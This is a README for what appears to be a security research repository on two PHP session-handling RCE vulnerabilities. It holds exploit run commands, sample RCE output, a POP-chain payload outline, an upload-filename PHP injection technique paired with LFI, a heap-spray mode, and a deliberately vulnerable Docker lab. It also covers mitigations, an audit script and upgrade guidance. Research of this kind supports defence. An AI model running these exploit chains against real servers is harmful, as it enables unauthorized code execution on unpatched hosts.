# PHP2Shell — CVE-2026-109618 / CVE-2026-109619

Independent analysis, exploitation PoCs, and defensive tooling for two critical pre-auth RCE vulnerabilities in PHP core's session handling.

**CVSS v4.0: 9.2 (Critical)** — Pre-auth, no user interaction, arbitrary code execution.

## Affected Versions

| Branch | Vulnerable | Fixed |
|--------|-----------|-------|
| PHP 8.5 | 8.5.0 – 8.5.11 | 8.5.12 |
| PHP 8.4 | 8.4.0 – 8.4.26 | 8.4.27 |
| PHP 8.3 | 8.3.0 – 8.3.35 | 8.3.36 |
| PHP 8.2 | 8.2.0 – 8.2.34 | 8.2.35 |
| PHP 5.4 – 8.1 | All versions | **EOL — no official fix** |

## TL;DR

Two heap use-after-free bugs in PHP's `ext/session/session.c`:

- **CVE-2026-109619** — The `session.upload_progress` handler caches raw `zval *` pointers (`post_bytes_processed`, `current_file_bytes_processed`) into HashTable buckets. When `php_session_rfc1867_update()` calls `php_session_initialize()`, the old session tree is destroyed but the cached pointers are never refreshed, leaving dangling references into freed heap memory. Requires `session.upload_progress.enabled = On` (the default).

- **CVE-2026-109618** — `PS(serializer)` is not reset between PHP-FPM requests (`php_rinit_session_globals` / `php_rshutdown_session_globals` skip it). A worker that processes a request to a directory using `php_serialize` retains that serializer for the next request to a directory using `php` (default). The resulting decode failure triggers `php_session_cancel_decode()` → `php_session_destroy()`, which fires `__destruct` on partially deserialized objects. Combined with a POP gadget chain, this yields RCE. **Does NOT require `session.upload_progress.enabled = On`.**

## Attack Chains

| # | Chain | Type | Requires upload_progress | Additional conditions |
|---|-------|------|:------------------------:|----------------------|
| 1 | Session File Injection + LFI | Logic bug | Yes | LFI vulnerability in the app |
| 2 | Cached pointer UAF → Handler overwrite | Memory corruption | Yes | Build-specific heap offsets |
| 3 | Serializer mismatch → `__destruct` | Deserialization | **No** | Per-directory serializer config + POP gadget |
| 4 | var_destroy reentry UAF | Memory corruption | **No** | Object with `__destruct` re-entering session system |
| 5 | Session fixation via POST body | Logic bug | Yes | Bypasses `session.use_only_cookies` |

## Exploitation PoCs

### Quick Start

```bash
# Start the vulnerable environment
cd environment && docker compose up -d

# CVE-2026-109618: serializer mismatch → POP chain → RCE
python3 poc/exploit_cve_2026_109618.py http://localhost:8080

# CVE-2026-109619: session file injection + LFI → RCE
python3 poc/exploit_cve_2026_109619.py http://localhost:8080/index.php --mode inject -c id

# CVE-2026-109619: UAF crash detection
python3 poc/exploit_cve_2026_109619.py http://localhost:8080/index.php --mode detect

# CVE-2026-109619: heap spray primitive demonstration
python3 poc/exploit_cve_2026_109619.py http://localhost:8080/index.php --mode spray

# Cleanup
cd environment && docker compose down -v
```

### CVE-2026-109618 — Serializer Mismatch → RCE

`poc/exploit_cve_2026_109618.py` exploits the `PS(serializer)` leak between FPM requests.  The attack does NOT require `session.upload_progress.enabled`.

1. **Write** — POST to a `php_serialize` endpoint stores a pipe-prefixed POP chain in the session file: `|O:6:"Logger":1:{s:7:"handler";O:14:"CommandHandler":...}`
2. **Trigger** — GET to a `php` (default) endpoint: the deserializer splits on `|`, unserializes the objects, and `__destruct` fires the chain → `shell_exec()`.

```
$ python3 poc/exploit_cve_2026_109618.py http://localhost:8080 -c "cat /etc/hostname"
[*] Target:  http://localhost:8080
[*] Command: cat /etc/hostname
[1] Creating session via php_serialize endpoint...
[2] Writing POP chain to session (php_serialize format)...
[3] Triggering deserialization via php serializer endpoint...
[4] Checking command execution...
[+] RCE CONFIRMED

    a1b2c3d4e5f6
```

Options: `--admin-path`, `--trigger-path`, `--output-file`, `-v` for verbose.

### CVE-2026-109619 — Upload Progress UAF → RCE

`poc/exploit_cve_2026_109619.py` has three modes:

| Mode | What it does | Reliability |
|------|-------------|-------------|
| `detect` | Sends crafted multipart to trigger UAF crash (segfault / 502) | High |
| `inject` | Injects PHP code via upload filename + LFI inclusion → RCE | High (needs LFI) |
| `spray` | Heap spray to demonstrate the controlled-write primitive | Medium (timing) |

The `inject` mode is the simplest RCE path: upload_progress stores the raw filename in the session file without sanitization.  A filename containing `<?php system(...) ?>` combined with a Local File Inclusion vulnerability gives code execution.

The `spray` mode demonstrates the heap feng shui technique from the ANALYSIS.md — form fields sized to reclaim the freed HashTable chunk, with the stale `Z_LVAL_P` write landing on attacker-controlled memory.  Full RCE via this path requires build-specific offsets (see `docs/ANALYSIS.md` §8).

Options: `--mode`, `-c` command, `--rate`, `--spray-count`, `--spray-size`, `--lfi-path`.

### Docker Test Environment

`environment/` contains a deliberately vulnerable PHP 8.1 + nginx setup:

- **PHP 8.1-fpm** (EOL, no patch available) with `upload_progress.enabled = On`
- **nginx** with `fastcgi_request_buffering off` (allows slow-send exploitation)
- **Single FPM worker** (`pm.max_children = 1`) to guarantee serializer persistence
- **Per-directory serializer mismatch** (`/` uses `php`, `/admin/` uses `php_serialize`)
- **POP gadget classes** (Logger → CommandHandler → shell_exec)
- **LFI endpoint** (`/lfi.php`) for session file inclusion

```bash
cd environment
docker compose up -d    # start
docker compose logs -f  # watch logs
docker compose down -v  # stop + cleanup
```

## Immediate Mitigation

> **Disabling `session.upload_progress.enabled` blocks chains 1, 2, and 5 but NOT chains 3 and 4.**

### For CVE-2026-109619 (upload progress UAF)

```ini
; php.ini — minimum mitigation
session.upload_progress.enabled = Off
```

```ini
; FPM pool — robust (cannot be overridden by .user.ini)
php_admin_flag[session.upload_progress.enabled] = off
```

For maximum protection before patching, use the [HOSTED-POWER guard extension](https://github.com/HOSTED-POWER/php_uploadprogress_guard) which NULLs the callback at process startup.

### For CVE-2026-109618 (serializer mismatch + __destruct)

```ini
; Ensure IDENTICAL serializer across ALL directories
session.serialize_handler = php_serialize

; Additional hardening
session.use_strict_mode = On
session.use_only_cookies = On
```

- Audit for `.user.ini` or `.htaccess` files overriding `session.serialize_handler`
- Ensure no per-directory PHP config sets a different serializer than the global default

### Definitive Fix

Upgrade to PHP **8.2.35**, **8.3.36**, **8.4.27**, or **8.5.12** (released 2026-10-21).

## Defensive Tooling

### Check if your server is mitigated

```bash
chmod +x mitigation/check_mitigation.sh
sudo ./mitigation/check_mitigation.sh
```

### Crash detection (legacy — use exploit_cve_2026_109619.py --mode detect instead)

```bash
python3 poc/poc_trigger.py https://your-server.example.com/index.php
```

## Repository Structure

```
poc/
  exploit_cve_2026_109618.py  — Serializer mismatch → POP chain → RCE
  exploit_cve_2026_109619.py  — Upload progress: detect / inject+LFI / heap spray
  poc_trigger.py              — Original crash-detection trigger

environment/
  docker-compose.yml          — Orchestration: PHP-FPM + nginx
  Dockerfile                  — PHP 8.1-fpm vulnerable build
  nginx/default.conf          — fastcgi_request_buffering off
  www/                        — Vulnerable application with gadget classes

docs/
  ANALYSIS.md                 — Full technical deep-dive (vulnerability mechanics,
                                code paths, exploitation primitives, all five findings)

mitigation/
  check_mitigation.sh         — Server audit: patch status, upload_progress config,
                                INI scope, guard extension, serializer consistency
```

## Key Technical Details

### CVE-2026-109619: The Cached Pointer UAF

The `php_session_rfc1867_progress` struct holds two raw `zval *` pointers:

```c
typedef struct _php_session_rfc1867_progress {
    // ...
    zval     *post_bytes_processed;           // cached ONCE at first FILE_START
    zval     *current_file_bytes_processed;   // refreshed per FILE_START
    // ...
} php_session_rfc1867_progress;
```

These point directly into HashTable buckets of `progress->data`. When `php_session_rfc1867_update()` throttle passes and calls `php_session_initialize()`, the old session tree is destroyed via `php_session_track_init()` → `zval_ptr_dtor()`. Although `progress->data` survives (refcount 2→1), the `SEPARATE_ARRAY()` in `MULTIPART_EVENT_END` creates a COW copy that splits the reference — the cached pointers then point into the OLD array (refcount 1, still in the session), which gets freed on the next `php_session_initialize()`.

### CVE-2026-109618: The Serializer Mismatch

Three independent defects combine:

1. **`PS(serializer)` not reset** — `php_rinit_session_globals()` and `php_rshutdown_session_globals()` skip `PS(serializer)`, so it leaks across FPM requests.

2. **`__destruct` on decode failure** — `php_session_cancel_decode()` calls `php_session_destroy()`, which fires `__destruct` on partially deserialized objects.

3. **var_destroy reentry** — If a `__destruct` re-enters the session system, the outer destruction continues on freed memory (ASAN-confirmed heap-use-after-free).

## Disclaimer

This repository is for **authorized security testing and educational purposes only**. Do not use against systems you do not own or have explicit written authorization to test.

The exploitation PoCs demonstrate real attack chains against a **self-contained Docker environment**. Running them against production systems without authorization is illegal in most jurisdictions.

## References

- [HOSTED-POWER php_uploadprogress_guard](https://github.com/HOSTED-POWER/php_uploadprogress_guard)
- [PHP Security Release 2026-10-21](https://www.php.net/archive/2026.php)
- [Mattias Geniar — Early mitigation steps](https://ma.ttias.be/php-cve-2026-109618-early-mitigation/)
- [Upwind — Initial Assessment](https://www.upwind.io/feed/initial-assessment-php2shell-two-critical-unpatched-php-rces-cve-2026-109618-cve-2026-109619)
- [ikow/php2shell-poc](https://github.com/ikow/php2shell-poc)

## License

MIT
